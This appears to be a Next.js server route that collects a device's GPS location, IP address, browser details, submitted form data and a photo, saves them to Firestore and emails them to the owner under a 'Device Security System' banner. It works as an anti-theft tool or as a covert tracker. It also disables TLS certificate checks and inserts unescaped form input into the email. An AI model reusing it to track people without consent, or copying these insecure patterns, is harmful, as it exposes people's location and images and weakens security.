import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'
import { adminDb } from '@/lib/firebase/firebase-admin'

interface LocationData {
  latitude?: number
  longitude?: number
  accuracy?: number
  ipAddress?: string
  userAgent?: string
  screenResolution?: string
  timezone?: string
  language?: string
  formData?: Record<string, any>
  imageBase64?: string
}

function getIpAddress(request: NextRequest): string {
  const forwarded = request.headers.get('x-forwarded-for')
  const realIp = request.headers.get('x-real-ip')
  const cfConnectingIp = request.headers.get('cf-connecting-ip')
  
  if (cfConnectingIp) return cfConnectingIp
  if (realIp) return realIp
  if (forwarded) return forwarded.split(',')[0].trim()
  
  return 'unknown'
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const locationData: LocationData = body

    console.log('Device location data received')

    // Get client IP address from headers
    const ipAddress = getIpAddress(request)
    const userAgent = request.headers.get('user-agent') || 'unknown'

    // Prepare data for storage (without image to save space)
    const dataToStore = {
      timestamp: new Date(),
      createdAt: new Date().toISOString(),
      latitude: locationData.latitude || null,
      longitude: locationData.longitude || null,
      accuracy: locationData.accuracy || null,
      ipAddress: locationData.ipAddress || ipAddress,
      userAgent: locationData.userAgent || userAgent,
      screenResolution: locationData.screenResolution || null,
      timezone: locationData.timezone || null,
      language: locationData.language || null,
      formData: locationData.formData || null,
      hasImage: !!locationData.imageBase64,
    }

    // Store in Firestore
    try {
      await adminDb.collection('device_locations').add(dataToStore)
      console.log('Device location saved to Firestore successfully')
    } catch (firestoreError) {
      console.error('Error saving to Firestore:', firestoreError)
    }

    // Try to send email notification if SMTP is configured
    const smtpConfigured = process.env.SMTP_USER && process.env.SMTP_PASS
    
    if (smtpConfigured) {
      try {
        const transporter = nodemailer.createTransport({
          host: process.env.SMTP_HOST || 'smtp.gmail.com',
          port: parseInt(process.env.SMTP_PORT || '587'),
          secure: process.env.SMTP_SECURE === 'true',
          auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS,
          },
          tls: {
            rejectUnauthorized: false
          }
        })

        // Build Google Maps link
        let mapLink = ''
        if (locationData.latitude && locationData.longitude) {
          mapLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
        }

        // Get IP info link
        const ipInfoLink = `https://ipinfo.io/${dataToStore.ipAddress}`

        // Prepare attachments if image is present
        const attachments: any[] = []
        if (locationData.imageBase64) {
          // Convert base64 to buffer
          const base64Data = locationData.imageBase64.replace(/^data:image\/\w+;base64,/, '')
          attachments.push({
            filename: 'device-photo.jpg',
            content: base64Data,
            encoding: 'base64',
            cid: 'device-photo'
          })
        }

        // Email content
        const mailOptions = {
          from: `"Device Security System" <${process.env.SMTP_USER}>`,
          to: process.env.CONTACT_EMAIL || process.env.SMTP_USER,
          subject: '🔔 Device Location & Photo Received',
          html: `
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Device Location & Photo Update</title>
            </head>
            <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif; background-color: #fafafa; color: #1a1a1a;">
              <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
                
                <!-- Header -->
                <div style="background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%); padding: 40px 30px; text-align: center;">
                  <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: 600; letter-spacing: -0.5px;">📸 Device Update</h1>
                  <p style="color: #fee2e2; margin: 8px 0 0 0; font-size: 16px; font-weight: 400;">Location & Photo Notification</p>
                </div>
                
                <!-- Content -->
                <div style="padding: 40px 30px;">
                  
                  <!-- Device Photo -->
                  ${locationData.imageBase64 ? `
                  <div style="background: #fff7ed; border: 2px solid #fb923c; border-radius: 12px; padding: 24px; margin-bottom: 24px; text-align: center;">
                    <h2 style="color: #c2410c; margin: 0 0 16px 0; font-size: 20px; font-weight: 600;">📷 Device Photo</h2>
                    <div style="background: #fff; padding: 12px; border-radius: 8px; display: inline-block;">
                      <img src="cid:device-photo" alt="Device Photo" style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);" />
                    </div>
                  </div>
                  ` : ''}
                  
                  <!-- Location Card -->
                  ${locationData.latitude && locationData.longitude ? `
                  <div style="background: #fff7ed; border: 2px solid #fb923c; border-radius: 12px; padding: 24px; margin-bottom: 24px;">
                    <h2 style="color: #c2410c; margin: 0 0 16px 0; font-size: 20px; font-weight: 600;">📍 GPS Location</h2>
                    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
                      <div style="flex: 1;">
                        <span style="color: #9a3412; font-size: 12px; font-weight: 600; text-transform: uppercase;">Latitude</span>
                        <div style="color: #c2410c; font-size: 18px; font-weight: 700; font-family: monospace;">${locationData.latitude.toFixed(6)}</div>
                      </div>
                      <div style="flex: 1;">
                        <span style="color: #9a3412; font-size: 12px; font-weight: 600; text-transform: uppercase;">Longitude</span>
                        <div style="color: #c2410c; font-size: 18px; font-weight: 700; font-family: monospace;">${locationData.longitude.toFixed(6)}</div>
                      </div>
                    </div>
                    ${locationData.accuracy ? `<div style="color: #9a3412; font-size: 13px; margin-top: 8px; margin-bottom: 16px;">Accuracy: ±${Math.round(locationData.accuracy)} meters</div>` : ''}
                    ${mapLink ? `
                    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                      <a href="${mapLink}" target="_blank" style="display: inline-block; background: #ea580c; color: #ffffff; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600;">
                        🗺️ View on Google Maps
                      </a>
                      <a href="https://www.openstreetmap.org/?mlat=${locationData.latitude}&mlon=${locationData.longitude}&zoom=15" target="_blank" style="display: inline-block; background: #22c55e; color: #ffffff; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600;">
                        🌍 OpenStreetMap
                      </a>
                    </div>
                    ` : ''}
                  </div>
                  ` : `
                  <!-- No GPS Available -->
                  <div style="background: #fef2f2; border: 2px solid #fca5a5; border-radius: 12px; padding: 24px; margin-bottom: 24px; text-align: center;">
                    <h2 style="color: #dc2626; margin: 0 0 8px 0; font-size: 20px; font-weight: 600;">⚠️ GPS Not Available</h2>
                    <p style="color: #991b1b; font-size: 14px; margin: 0;">Location data was not captured. IP-based location will be used instead.</p>
                  </div>
                  `}
                  
                  <!-- Network Info Card -->
                  <div style="background: #ffffff; border: 1px solid #e5e5e5; border-radius: 12px; padding: 32px; margin-bottom: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
                    <h2 style="color: #1a1a1a; margin: 0 0 24px 0; font-size: 20px; font-weight: 600;">Network & Device Information</h2>
                    
                    <div style="margin-bottom: 20px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">IP Address</span>
                      <div style="color: #1a1a1a; font-size: 16px; font-weight: 600; font-family: monospace; margin-top: 4px;">
                        ${dataToStore.ipAddress}
                        <br />
                        <a href="${ipInfoLink}" target="_blank" style="color: #2563eb; text-decoration: none; font-size: 13px; font-weight: 400;">
                          🔍 View IP details →
                        </a>
                      </div>
                    </div>
                    
                    ${dataToStore.timezone ? `
                    <div style="margin-bottom: 20px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">Timezone</span>
                      <div style="color: #1a1a1a; font-size: 16px; font-weight: 500; margin-top: 4px;">${dataToStore.timezone}</div>
                    </div>
                    ` : ''}
                    
                    ${dataToStore.language ? `
                    <div style="margin-bottom: 20px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">Language</span>
                      <div style="color: #1a1a1a; font-size: 16px; font-weight: 500; margin-top: 4px;">${dataToStore.language}</div>
                    </div>
                    ` : ''}
                    
                    ${dataToStore.screenResolution ? `
                    <div style="margin-bottom: 20px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">Screen Resolution</span>
                      <div style="color: #1a1a1a; font-size: 16px; font-weight: 500; margin-top: 4px;">${dataToStore.screenResolution}</div>
                    </div>
                    ` : ''}
                    
                    <div style="background: #f8f8f8; padding: 16px; border-radius: 8px; border-left: 4px solid #1a1a1a; margin-top: 20px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">User Agent</span>
                      <div style="color: #666666; font-size: 13px; margin-top: 8px; line-height: 1.4; word-break: break-all;">${dataToStore.userAgent}</div>
                    </div>
                  </div>
                  
                  <!-- Form Data -->
                  ${locationData.formData ? `
                  <div style="background: #ffffff; border: 1px solid #e5e5e5; border-radius: 12px; padding: 32px; margin-bottom: 24px;">
                    <h2 style="color: #1a1a1a; margin: 0 0 24px 0; font-size: 20px; font-weight: 600;">Submitted Information</h2>
                    ${Object.entries(locationData.formData).map(([key, value]) => `
                    <div style="margin-bottom: 16px;">
                      <span style="color: #666666; font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px;">${key}</span>
                      <div style="color: #1a1a1a; font-size: 16px; font-weight: 500; margin-top: 4px;">${value}</div>
                    </div>
                    `).join('')}
                  </div>
                  ` : ''}
                  
                  <!-- Timestamp -->
                  <div style="text-align: center; padding: 20px 0; border-top: 1px solid #e5e5e5;">
                    <p style="color: #999999; font-size: 13px; margin: 0; font-weight: 400;">
                      Timestamp: ${new Date().toLocaleString()}
                    </p>
                  </div>
                  
                </div>
                
                <!-- Footer -->
                <div style="background: #1a1a1a; color: #ffffff; padding: 24px 30px; text-align: center;">
                  <p style="margin: 0; font-size: 14px; font-weight: 400; color: #cccccc;">
                    🔐 Device Security System
                  </p>
                </div>
                
              </div>
            </body>
            </html>
          `,
          attachments,
        }

        // Send email asynchronously
        transporter.sendMail(mailOptions)
          .then(() => console.log('Location notification email sent successfully'))
          .catch(err => console.error('Error sending location email:', err))

      } catch (emailError) {
        console.error('Email error (location saved to database):', emailError)
      }
    }

    // Return success response
    return NextResponse.json(
      { success: true, message: 'Location data received' },
      { status: 200 }
    )

  } catch (error) {
    console.error('Error processing location data:', error)
    return NextResponse.json(
      { success: false, error: 'Failed to process location data' },
      { status: 500 }
    )
  }
}
